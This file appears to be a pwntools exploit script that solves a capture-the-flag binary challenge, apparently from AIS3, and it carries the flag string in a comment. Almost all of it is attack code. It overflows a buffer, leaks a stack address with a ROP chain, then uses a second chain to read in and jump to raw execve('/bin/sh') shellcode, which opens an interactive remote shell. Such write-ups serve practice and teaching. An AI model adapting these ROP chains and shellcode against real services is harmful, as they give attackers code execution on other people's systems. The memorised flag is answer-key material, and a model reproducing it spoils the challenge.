#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# ais3{pwn2_5taRt_r3v3enG3}

context.arch = 'amd64'

host , port = '10.13.2.43' , 20739
y = remote( host , port )

syscall = 0x400122
add_rsp_ret = 0x400110
out_write = 0x400103
pop_rdx = 0x4000ab
pppr = 0x4000a9 # pop rdi , pop rsi , pop rdx , ret
read = 0x40011f
bss = 0x600125
bss = 0x600125
pt = 0x4000de
stk = 0x7ffe4efa2618
pop_rax_ret = 0x400114
main = 0x400080
'''
    xor rax,rax
	syscall
	ret
'''

p = 'a' * 0x30
p += 'RBBBBBBP'
p += flat(
    0x4000aa,
    0x100,
    0x100,
    0x400108,
    0x0

)

p += 'a' * ( 0x80 - len(p) - 8 )
p += p64( main )
print hex( len( p ) )

'''
    mov rax, 0x0068732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    push 0x3b
    pop rax
    syscall
'''

y.sendafter( '?' , p )
y.recvuntil('a' * 24)
y.recv( 8 )

stk = u64( y.recv(6).ljust( 8 , '\x00' ) )
log.success( 'stack -> {}'.format( hex( stk ) ) )


p = 'A' * 0x38
p += flat(
    pppr,
    0x0,
    stk,
    0x70,
    read,
    stk
)

y.sendafter( '?' , p )

y.send( 'H\xb8/bin/sh\x00PH\x89\xe7H1\xf6H1\xd2j;X\x0f\x05' )


y.interactive()